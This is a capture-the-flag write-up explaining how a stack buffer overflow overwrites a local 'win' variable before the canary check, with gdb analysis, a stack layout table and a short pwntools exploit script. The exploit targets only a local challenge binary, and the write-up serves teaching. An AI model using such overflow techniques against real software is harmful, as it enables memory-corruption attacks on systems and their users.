# **Binary Exploitation Write-Up: Stack-Based `win` Variable Overwrite**

## **Challenge Description**
We are given a binary with a `challenge()` function that:
1. Reads user input into a stack-based buffer.
2. Checks a `win` variable (initially zero).
3. If `win` is non-zero, it calls a `win()` function that prints the flag.
4. Has stack canary protection, but the `win` check happens **before** the canary verification.

**Protections:**
- **Stack Canary**: Present (but bypassable in this case)
- **NX**: Enabled (stack non-executable)
- **No PIE**: Addresses are constant
- **Full RELRO**: Global Offset Table (GOT) is read-only

---

## **Thought Process & Methodology**

### **Step 1: Initial Analysis**
1. **Run `checksec`** to understand binary protections:
   ```bash
   checksec ./challenge
   ```
   - **Observation**: Stack canary is present, but no PIE (addresses are fixed).

2. **Inspect functions**:
   ```bash
   gdb ./challenge
   (gdb) info functions
   ```
   - Key functions: `challenge`, `win`.

3. **Disassemble `challenge`**:
   ```bash
   (gdb) disas challenge
   ```
   - **Key observations**:
     - `win` variable is at `rbp-0x14`.
     - Buffer starts at `rbp-0x30`.
     - Canary is at `rbp-0x8`.
     - `read()` allows up to `0x1000` bytes (much larger than the buffer).

---

### **Step 2: Understanding the Stack Layout**
We need to visualize the stack to determine how to overwrite `win`:

| Address       | Content            | Size (bytes) |
|---------------|--------------------|--------------|
| `rbp-0x30`    | Buffer start       | 24           |
| `rbp-0x18`    | (Padding)          | 4            |
| `rbp-0x14`    | `win` variable     | 4            |
| `rbp-0x10`    | (Unused)           | 8            |
| `rbp-0x8`     | **Canary**         | 8            |
| `rbp`         | Saved RBP          | 8            |
| `rbp+0x8`     | Return Address     | 8            |

**Key Insight**:
- The `win` variable is **between the buffer and the canary**.
- The `win` check happens **before** the canary check, so we can overwrite it without leaking the canary.

---

### **Step 3: Calculating the Offset**
To overwrite `win`, we need to compute the distance from the buffer start to `win`:
- Buffer starts at `rbp-0x30`.
- `win` is at `rbp-0x14`.
- **Offset = `0x30 - 0x14 = 0x1C` (28 bytes)**.

**Payload Structure**:
```
[28 bytes padding] + [4-byte non-zero value]
```

---

### **Step 4: Crafting the Exploit**
We need to:
1. Fill 28 bytes to reach `win`.
2. Overwrite `win` with any non-zero value (e.g., `0x1337`).
3. Avoid corrupting the canary (though it doesn’t matter here since `win` is checked first).

**Python Exploit (using `pwntools`)**:
```python
from pwn import *

# Start the binary
p = process("./challenge")

# Calculate offset to win (28 bytes)
offset = 28

# Craft payload: 28 bytes junk + 4-byte non-zero
payload = b"A" * offset + p32(0x1337)

# Send payload
p.send(payload)

# Receive the flag
print(p.recvall())
```

---

### **Step 5: Why This Works**
1. **Input is read into the buffer** (`rbp-0x30`).
2. **First 28 bytes** fill the buffer and padding.
3. **Next 4 bytes** (`0x1337`) overwrite `win`.
4. **Program checks `win`**:
   - Sees `0x1337` (non-zero) → Calls `win()` → Prints flag.
5. **Canary check happens later**, but we already got the flag!

---

## **Key Takeaways**
1. **Stack Layout Analysis**:
   - Always map out variables on the stack (buffer, canary, saved registers).
   - Use `gdb` to inspect memory (`x/xw $rbp-0x14` to check `win`).

2. **Exploit Strategy**:
   - If a variable is checked **before** security mechanisms (like canary), it may be exploitable.
   - Precision matters: Calculate exact offsets to avoid crashes.

3. **Protections Bypass**:
   - Canaries prevent **return address overwrites**, but not necessarily other variables.
   - No PIE makes exploitation easier (addresses are predictable).

4. **Debugging Tips**:
   - Use `gdb` to verify offsets (`print $rbp-0x30`).
   - Check if `win` was correctly overwritten (`x/wx $rbp-0x14`).

---

## **Final Answer**
By sending **28 bytes of padding followed by a 4-byte non-zero value**, we overwrite the `win` variable, triggering the `win()` function and printing the flag—**without needing to bypass the canary**.

### **Exploit Code**
```python
from pwn import *

p = process("./challenge")
payload = b"A"*28 + p32(0x1337)  # 28 bytes padding + 4-byte win overwrite
p.send(payload)
print(p.recvall())  # Get flag
```

---

## **Conclusion**
This challenge teaches:
- **Importance of stack layout analysis**.
- **How variable checks can be exploited before security mechanisms trigger**.
- **Precise offset calculation for successful exploitation**.

